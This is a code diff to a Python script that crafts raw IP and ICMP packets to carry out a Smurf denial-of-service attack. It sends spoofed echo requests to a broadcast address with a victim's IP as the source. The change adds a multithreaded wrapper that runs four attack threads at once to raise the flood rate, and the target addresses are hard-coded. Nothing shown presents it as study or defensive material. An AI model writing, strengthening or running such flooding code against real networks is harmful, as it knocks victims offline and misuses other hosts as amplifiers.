@@ -1,10 +1,12 @@
 import socket
 import struct
+import threading
 import time
 
 ICMP_ECHO_REQUEST = 8
 PACKETS_COUNTER = 100
 DELAY = 0.01
+THREADS = 4
 
 
 def calculate_checksum(source_string):
@@ -42,7 +44,7 @@ def create_icmp_packet():
 
 
 def create_ip_header(source_ip, destination_ip):
-    version_ihl = (4 << 4) + 5  # Version 4, IHL 5
+    version_ihl = (4 << 4) + 5  # Version 4, IHL (Internet Header Length) 5 dword
     tos = 0
     total_length = 20 + 8  # IP header + ICMP packet
     ip_id = 54321  # ID of this packet
@@ -84,7 +86,18 @@ def send_smurf_attack(broadcast_ip, victim_ip):
         time.sleep(DELAY)
 
 
+def thread_smurf_attack(broadcast_ip, victim_ip):
+    threads = []
+
+    for i in range(THREADS):
+        t = threading.Thread(target=send_smurf_attack, args=(broadcast_ip, victim_ip))
+        threads.append(t)
+        t.start()
+
+    for t in threads:
+        t.join()
+
 broadcast_ip = "172.20.10.255"
 victim_ip = "172.20.10.3"
 
-send_smurf_attack(broadcast_ip, victim_ip)
+thread_smurf_attack(broadcast_ip, victim_ip)
